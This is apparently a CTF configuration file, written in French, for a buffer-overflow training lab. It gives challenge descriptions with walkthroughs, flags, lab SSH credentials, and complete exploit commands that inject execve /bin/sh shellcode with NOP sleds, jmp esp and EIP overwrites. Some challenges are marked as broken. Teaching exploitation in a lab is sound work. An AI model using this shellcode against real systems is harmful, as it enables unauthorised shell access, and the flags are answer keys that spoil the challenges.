#
# ctf-buffer
#
# Configuration des challenges
#
# [XXX] Label du challenge, doit être unique, sans contrainte particulière
# name: Home Sweet Home : Nom du challenge tel qu'il apparait sur les pages HTLM
# value: 10 : Nombre de points marqués pour la résolution du challenge
# category: Ghost in the Shell : Catégorie regroupant plusieurs challenges
# flag: flag_{m0n_pr3m13r_fl4g} : format libre
# file: (optionnel) : le nom d'un fichier qui sera téléchargeable par les participants.
# description: 
#    La description peut tenir sur une ou plusieurs lignes.
#    [espace !!] Les lignes de la description doivent commencer par un ESPACE ou une TABULATION
#    Dès qu'une ligne recommence à la première colonne, on a terminé la description
#    Cette description est collée dans du HTML après un passage dans un léger parser Markdown
#    Utiliser la balise </br> pour chaque retour à la ligne
#    Mettre les morçeaux de code ou commande entre deux lignes de ```
#    ```
#    $ commande shell, ou bout de code
#    ```



[Intro]
category: Buffer overflows
label: Buffer overflows
docker: ctf-buffer
description: 
    ## Buffer overflows   
    .
    Quand vous saisissez votre nom, votre mail, un message, le programme doit leur réserver une place pour les stocker quelque part en mémoire.   
    Quand vous envoyez une requète HTTP, le serveur doit la stocker, l'analyser, décoder les champs en base64...
    .
    Dans son programme, John a besoin de saisir une adresse mail. Il va réserver un buffer de 1024 octets. Ca peut sembler généreux...
    Notre job, c'est de trouver ces fonctions et leur envoyer un mail de 2000 octets... Qui vont venir écraser la mémoire, et les variables qui s'y trouvent.
    On peut ainsi injecter du code et prendre la main sur le système.
    Ces vulnerabilités sont caractéristiques des programmes en C... qui reviennent en masse dans les objets connectés.
    .
    Pour trouver un buffer overflow, on utilise un fuzzer qui injecte des données aléatoires partout ou c'est possible.
    Pour exploiter un buffer overflow, il faut un minimum de connaissance de la structure en mémoire des programmes, de l'utilisation des adresses et registres. Et savoir ou trouver les bonnes payload pour son système.
    Linux dispose de protection contre le buffer Overflow. On commence par les désactiver, et on les réactive au fur et à mesure pour monter la difficulté.
    Nos buffers overflow permettent de toucher du doigt le principe sans mettre les mains dans l'assembleur.
    .
    Pour se former :
    Tutoriel par Hack'n do [https://beta.hackndo.com/buffer-overflow/]
    Article historique sur les Buffers overflows de Aleph One : http://phrack.org/issues/49/14.html
    
    


[Challenge_1]
name:  Ca dépasse !! 
value: 10
file:  buffer_01.c
category:  Buffer overflows
flag:  flag{J3_su1s_tr0p_d3b0rd3}
description: 
    ```
    ssh bender@IPSERVER         
    mdp: leelu
    ```
    Le programme say_hello vient de remporter le concours de l'IA la plus futée du MIT. Malheureusement ses concepteurs se sont concentrés sur les performances du CPU et un peu négligé la sécurité.
    Jette un oeil a son source: buffer_01.c
    ```
    $ ./say_hello bob
    ```
    Remplace bob par 12345678901234567890.
    Ca dépasse des 10 caractères alloués au tableau name.
    Et ça va écraser le tableau intro[10]="Hello";
    Si nous continuons, nous pouvons écraser la variable tst, et forcer un appel à print_flag();




[Challenge_2]
name:  Baisse la tête
value: 15
file:  buffer_02.c
category:  Buffer overflows
flag:  flag{c4_d3p3nd_c4_d3p4ss3_t0uj0urs}
description: 
   ```
    ssh leela@IPSERVER         
    mdp: yivo
    ```
    Les programmeurs ont sorti une version 2 de leur IA, avec une sécurité renforcée.
    Jette un oeil a son source: buffer_02.c
    .
    Il faut forcer la valeur de tst à 'Z' pour déclencher un appel à print_flag();
    




[Challenge_3]
name:  Sec Check
value: 20
file:  buffer_03.c
category:  Buffer overflows
flag:  flag{3t_3n_t4ss4nt_un_p3u}
description: 
   ```
    ssh philip@IPSERVER         
    mdp: elzar
    ```
    Alertés par la communauté, et sous la pression des investisseurs qui détestent le bad nuzz, les programmeurs ont sorti une version 3 de leur IA, toujours plus sécure.
    Jette un oeil a son source: buffer_03.c
    .
    Il faut forcer la valeur de tst à 'SecCheck' pour déclencher un appel à print_flag();
    




[Challenge_overflow1]
name:  Fuzzer
value: 20
file:  buffer_04.c
category:  Buffer overflows
flag:  1008
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Pour detecter un buffer overflow, nous utilisons un fuzzer: un logiciel qui va générer des données de longueurs fixées avec des patterns. Il existe des fuzzers plus ou moins sophistiqués.
    Nous allons utiliser un fuzzer basique: un script mixte shell et python qui va générer une chaine de AAAAAAA de longueur variable.
    .
    Dans le code source, nous voyons que la taille du buffer est de 1000 caractères. Nous allons tester des chaines de A entre 1000 et 1020 caractères.
    ```
    for i in `seq 1000 1020`; do echo $i; done;
    ```
    Ce script shell va écrire des valeurs entre 1000 et 1020.
    .
    ```
    $(python -c "print 'A'*50")
    ```
    Ce script python va écrire une chaine de 'A' de 50 caractères.
    En combinant ces deux scripts sur une ligne de commande, nous obtenons :
    ```
    for i in `seq 1000 1020`; do echo $i; ./say_hello4 $(python -c "print 'A'*$i"); done;
    ```
    Ce script va écrire la valeur de $i, et générer une chaine de 'A' de longueur $i.
    $i va varier de 1000 à 1020.
    .
    ```
    Segmentation fault 
    ```
    Des que nous avons ce message, c'est gagné !
    .
    Le flag est la taille de la chaine minimale qui génère un buffer overflow.
    


[Challenge_overflow2]
name:  EIP control
value: 20
file:  buffer_04.c
category:  Buffer overflows
flag:  1012
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Dans le challenge précédent, nous avons généré un buffer overflow.
    Dans celui-ci nous allons prendre le control sur l'execution des instructions
    .
    Les programmes rangent le code à éxécuter dans une partie de la mémoire, et leurs données dans une autre zone.
    Pour notre plus grand plaisir, le register EIP qui pointe vers la prochaine instruction de code à executer sauve régulièrement sa valeur parmi les données.. Plus précisément, quelques octets après les variables qui contiennent nos données, et que nous pouvons faire déborder...
    .
    En écrasant les valeurs des données avec un buffer overflow, nous pouvons écraser la valeur d'EIP et forcer l'adresse de la prochaine instruction à executer. 
    Pour un programme en 32 bits, ce qui est le cas de notre binaire, les adressess ont codées sur 4 octets. 
    Nous allons tenter de mettre la valeur 'BBBB' dans EIP.
    Pour celà, nous allons utiliser une chaine de 'AAAAAAA' suivie de 'BBBB'. 
    Nous allons progressivement augmenter la taille de notre chaine de 'AAAA', jusqu'à ce qu'elle pousse 'BBBB' dans EIP.
    .
    Quand nous lançons say_hello4 directement, nous ne voyons que le message 'Segmentation fault'. Nous allons le lançer avec gdb, le déboggeur pour connaitre l'adresse qui a généré ce 'Segmentation fault'.
    En hexadécimal, 'BBBB' s'écrit 0x42424242
    Quand nous aurons un 'Segmentation fault' du à l'adresse 0x42424242, nous connaitrons la taille du buffer qui permet de prendre le controle d'EIP.

    ```
    Program received signal SIGILL, Illegal instruction.
    0x08048401 in __do_global_dtors_aux ()      - On a généré des erreurs mais pas encore touché EIP
    Program received signal SIGSEGV, Segmentation fault.
    0x08040042 in ?? ()                         - Un 42, la lettre B vient d'apparaitre dans EIP
    Program received signal SIGSEGV, Segmentation fault.
    0x08004242 in ?? ()                         - Deux 42, arrivent dans EIP, on progresse
                       
    Program received signal SIGSEGV, Segmentation fault.
    0x00424242 in ?? ()                         - Trois 42, on y est presque
    Program received signal SIGSEGV, Segmentation fault.
    0x42424242 in ?? ()                         => On y est !!!!!
    Program received signal SIGSEGV, Segmentation fault.
    0x42424241 in ?? () - On a trop poussé, un A, code 0x41 apparait
    Program received signal SIGSEGV, Segmentation fault.
    0x42424141 in ?? () - On a trop poussé, deux A, code 0x41 arrivent et poussent les B
    ```
    Le flag est la taille de la chaine qui permet d'écrire BBBB dans EIP.
    ```
    for i in `seq 1008 1020`; do echo $i; gdb -batch -ex='run' -args ./say_hello4 $(python -c "print 'A'*$i+'BBBB'"); done;
    ```
    

[Challenge_overflow3]
name:  Function call
value: 20
file:  buffer_04.c
category:  Buffer overflows
flag:  flag{tr0p_b13n_c4ch3}
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Dans le  challenge précédent, nous avons redirigé l'execution du programme à l'adresse en BBBB. Cette adresse, qui ne correspond à rien, génère une erreur.
    Nous allons le rediriger vers une fonction existante du programme : print_flag()
    .
    objdump -x  say_hello4,  donne de nombreuses informations sur say_hello4. Il liste entre autre toutes les fonctions et leurs adresses.
    ```
    objdump -x say_hello4 | grep print_flag
    080484f9 g     F .text	00000019              print_flag    
    ```
    La première colonne donne l'adresse de la fonction print_flag.
    Elle est en 0x080484f9.
    Ce qui se code en python '\xf9\x84\x04\x08'
    .
    Lançons say_hello4 avec la bonne taille de buffer et en mettant cette adresse à la place de BBBB.
    ```
    ./say_hello4 $(python -c "print 'A'*1012+'\xf9\x84\x04\x08'");
    ```
    
    
    

[Challenge_overflow_fuzzer2]
name:  Fuzzer patterns
value: 50
file:  buffer_05.c
file:  pattern.py
category:  Buffer overflows
flag:  212
description: 
   ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Un fuzzers de pattern permet de trouver rapidement l'offset d'EIP.
    Nous utilisons un fuzzer en python dispo dans github: https://github.com/Svenito/exploit-pattern
    ```
    # python pattern.py 300
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
    ```  
    Ce script python va générer une suite de caractères dont chaque séquence de 4 caractères est unique.
    
    ```
    # gdb -batch -ex='run' -args ./say_hello5 $(python pattern.py 300)
    Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

    Program received signal SIGSEGV, Segmentation fault.
    0x31684130 in ?? ()
    ```
    Nous récupérons l'adresse qui a généré l'erreur dans EIP :0x31684130
    ```
    # python pattern.py 0x31684130
    Pattern 0x31684130 first occurrence at position 212 in pattern.

    ```
    Le fuzzer nous permet d'en déduire directement l'offset.
 



[Challenge_overflow_esp]
name:  Ret2Reg - Jump ESP
value: 50
file:  buffer_05.c
category:  Buffer overflows
flag:  1012
description: 
   ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Avant 2005, sous Linux, la Stack était toujours située à la même adresse, ce qui rendait les exploits de buffer relativement faciles.
    La protection ASLR (Address Space Layout Randomization) a donc été introduite: à chaque lancement d'un programme d'adresse de sa Stack change.
    Cette protection est activée par défaut sur Linux depuis le kernel 2.6.20 (juin 2005).
    .
    La famille des techniques de appelées Ret2Reg, utilisent des registres qui pointent déjà vers la Stack. 
    La technique de Jump ESP permet de se passer de la connaissance de l'adresse de la Stack.
    Elle consiste littéralement à dire au processeur: 'ta prochaine instruction se trouve à l'adresse pointée par le registre ESP... Or le registre ESP a pour vocation de pointer la Stack.
    .
    Il faut trouver dans le code du programme l'instruction en assembleur 'jmp ESP', et mettre son adresse dans EIP.
    Dans un gros programme, on a des chances d'en trouver une. Dans le cadre d'un CTF, cette instruction est volontairement introduite :).
    ```
    $ objdump -d say_hello5| grep esp | grep jmp
    0804846b <jmp_esp>:
    804846e:	ff e4                	jmp    *%esp
    ```
    On utilise 'objdump -d xxx' pour trouver l'adresse d'une fonction 'jmp esp'.
    Nous en avons une en 0x0804846e.
    Nous faisons comme sur les exploits précédents, en changeant d'adresse des ROP par l'adresse de cette instruction.
    ```
    # ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
    ```
 



########################################################### A deplacer





 

# ko : va_space 2
[Challenge_overflow4]
name:  /bin/dash
value: 50
file:  buffer_04.c
category:  Buffer overflows
flag:  1012
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    En prérequis à ce challenge la commande suivante doit retourner un 0.
    Si vous avez un 1 ou un 2, le niveau de protection de votre système ne permet pas de l'executer, passez au challenge suivant.
    ```
    cat /proc/sys/kernel/randomize_va_space
    ```

    Dans les deux  challenges précédent, nous avons généré un buffer overflow, et pris le controle du pointeur vers la prochaine instruction à executer.
    Dans celui-ci nous allons injecter nos propres instructions à executer: notre payload.
    Ces instructions sont des suites de commandes en assembleur.
    Il en existe de toutes prêtes sur : [http://shell-storm.org/shellcode/]
    ```
    '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
    ```
    Notre payload va executer l'appel system(/bin/sh) pour ouvrir un shell.
    Nous utilisons /bin/sh plutot que /bin/bash : bash est réputé baisser les privilèges sur les programmes avec un sticky bit.
    Elle fait 45 caractères de long.
    Nous allons ajouter des instructions assembleur NOP devant cette payload pour atteindre 112 caractères.
    L'instruction NOP veut juste dire 'ne fais rien' et passe à l'instruction suivante.
    Elle s'écrit 0x90 en assembleur.
    Suite de NOP est une suite de 0x90909090 en mémoire, on parle d'une rampe de NOP - ROP Sledge
    Nous allons faire pointer l'adresse de la prochaine instruction au milieu de ces NOP.
    .
    Nous allons récupérer l'adresse de ces NOP à l'aide du débogueur gdb.
    Le binaire a été compilé avec des options de débogage, ça nous simplifie la vie. 
    Nous plaçons un point d'arret à la ligne 21, lançons l'execution du programme, puis demandons d'affichage des données (la Stack).

    ```
    fry@ctf-buffer:~$ gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='b 21' -ex='run' -ex='x/300x $esp' -args  ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x20\xd7\xff\xff'") 
    Breakpoint 1 at 0x8048459: file buffer_04.c, line 21.

    Breakpoint 1, say_hello (arg=0xffffdaa9 '\220' <repeats 200 times>...) at buffer_04.c:21
    21          printf("Hello %s\n", buffer);
    0xffffd4c0:     0x00000004      0x00000007      0x90909090      0x90909090
    0xffffd4d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd4e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd4f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd500:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd510:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd520:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd530:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd540:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd550:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd560:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd570:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd580:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd590:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd600:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd610:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd620:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd630:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd640:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd650:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd660:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd670:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd680:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd700:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd710:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd720:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd730:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd740:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd750:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd760:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd770:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd780:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd790:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd800:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd810:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd820:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd830:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd850:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd860:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd870:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd880:     0x90909090      0x90909090      0x90909090      0xeb909090
    0xffffd890:     0x76895e1f      0x88c03108      0x46890746      0x890bb00c
    0xffffd8a0:     0x084e8df3      0xcd0c568d      0x89db3180      0x80cd40d8
    0xffffd8b0:     0xffffdce8      0x69622fff      0x68732f6e      0x08048400
    0xffffd8c0:     0xffffdaa9      0xffffd984      0xffffd994      0x080484f1
    0xffffd8d0:     0xf7fcb3dc      0xffffd8f0      0x00000000      0xf7e31637
    0xffffd8e0:     0xf7fcb000      0xf7fcb000      0x00000000      0xf7e31637
    0xffffd8f0:     0x00000003      0xffffd984      0xffffd994      0x00000000
    0xffffd900:     0x00000000      0x00000000      0xf7fcb000      0xf7ffdc04
    0xffffd910:     0xf7ffd000      0x00000000      0xf7fcb000      0xf7fcb000
    0xffffd920:     0x00000000      0x76bd70aa      0x4f277eba      0x00000000
    0xffffd930:     0x00000000      0x00000000      0x00000003      0x08048340
    0xffffd940:     0x00000000      0xf7fee010      0xf7fe8880      0xf7ffd000
    0xffffd950:     0x00000003      0x08048340      0x00000000      0x08048361
    0xffffd960:     0x08048473      0x00000003      0xffffd984      0x080484d0
    ```
    Nous avons ci-dessus le dump mémoire de la zone de donnée.
    .
    La colonne de gauche donne les adresses, les 4 colonnes de droite le contenu de la mémoire.
    On retrouve bien les 967 NOP, puis la payload, et enfin l'adresse de la prochaine instruction.
    .
    Nous allons prendre une adresse dans le premier tiers de la zone des NOP, et la saisir à la place de BBBB.
    Nous prenons une adresse dans la zone de NOP, car le début exact de la zone des données va changer entre un process lancé normalement et le même process sous déboggeur.
    L'adresse exacte dépend entre autre des variables d'environnement. Une adresse dans le premier tiers de la zone nous permet d'avoir un peu de marge.
    Petites contraintes: Cette adresse ne doit pas contenir le caractère 00, et elle va s'écrire à l'envers. Sur un processeur i386, les adresses s'écrivent la partie de poid faible à gauche.
    .
    Prenons par exemple l'adresse: 0xffffd560
    Elle va s'écrire '\x60\xd5\xff\xff'
    Modifiez l'adresse à la fin, et lançez de la commande suivante :
   
    ```
    ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x60\xd5\xff\xff'")

    ```
    Si le shell ne se lance pas, essayez avec une autre adresse au milieu, ou dans le dernier tiers des NOP.
    .
    Le flag s'affichera quand vous obtiendrez votre shell.
    






[Challenge_overflow_eax]
name:  Call EAX
value: 50
file:  buffer_05.c
category:  Buffer overflows
flag:  1012
description: 
    NOTE: Ne fonctionne pas....
   ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Une seconde technique de contournement de l'ASLR est le 'Call EAX'. Elle ne fonctionnement que dans le cas très précis ou la fonction qui va écrire notre payload dans la Stack est la dernière fonction appelée juste avant le retour de fonction, et place l'adresse du buffer copié dans le registre EAX.
    Ce n'est pas courant, mais ça se trouve. 
    .
    La fonction strcpy qui génère notre overflow est appelée juste avant le retour de la fonction. Cette fonction va placer dans le registre ESP un pointeur vers le buffer copié qui contient notre payload.
    Il faut trouver dans le code du programme une instruction en assembleur qui génère un appel vers l'adresse stoquée dans ESP.
    C'est à dire un 'call EAX'.
    ```
    $ # objdump -d say_hello5| grep eax | grep call
    80483d3:	ff d0                	call   *%eax
    
    ```
    On utilise 'objdump -d xxx' pour trouver l'adresse d'une fonction 'call eax'.
    Nous en avons une en 0x080483d3.
    Nous reprenons l'exploit précédent, en changeant d'adresse des ROP par l'adresse de cette instruction.
    ```
    # ./say_hello5 $(python -c "print '\x90'*(212-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x6e\x84\x04\x08'")
    ```
 


[Challenge_overflow_ret2libc]
name:  Ret2LibC
value: 50
file:  buffer_05.c
category:  Buffer overflows
flag:  1012
description: 
    Not working...
    ```
    # gdb -batch -ex='print system' -args ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'")
    $1 = {<text variable, no debug info>} 0x8048370 <system@plt>
    ```
    ```
    # export MYSHELL=/bin/sh
    root@0df9c752089e:/home/zapp# gdb -batch -ex='show environment' -args ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'")
    HOSTNAME=0df9c752089e
    TERM=xterm
    OLDPWD=/
    LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    PWD=/home/zapp
    SHLVL=1
    HOME=/root
    NOTVISIBLE=in users profile
    MYSHELL=/bin/sh
    _=/usr/bin/gdb
    LINES=28
    COLUMNS=139
    ```
    ```
    # gdb -batch -ex='b 36' -ex='run' -ex='print exit' -args ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.

    Breakpoint 1, main (argc=2, argv=0xffffd774) at buffer_05.c:36
    36	    if (argc<=1) { 
    $1 = {<text variable, no debug info>} 0xf7e479d0 <__GI_exit>
    ```
    ```
    # gdb -batch -ex='b 36' -ex='run' -ex='x/30s *((char **)environ)' -args ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.

    Breakpoint 1, main (argc=2, argv=0xffffd774) at buffer_05.c:36
    36	    if (argc<=1) { 
    0xffffd97c:	"HOSTNAME=0df9c752089e"
    0xffffd992:	"SHLVL=1"
    0xffffd99a:	"OLDPWD=/"
    0xffffd9a3:	"HOME=/root"
    0xffffd9ae:	"_=/usr/bin/gdb"
    0xffffd9bd:	"TERM=xterm"
    0xffffd9c8:	"COLUMNS=139"
    0xffffd9d4:	"MYSHELL=/bin/sh"
    0xffffd9e4:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    0xffffda26:	"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
    0xffffdaee:	"=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=0"...
    0xffffdbb6:	"1;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo"...
    0xffffdc7e:	"=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:"...
    0xffffdd46:	"*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt"...
    0xffffde0e:	"=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.o"...
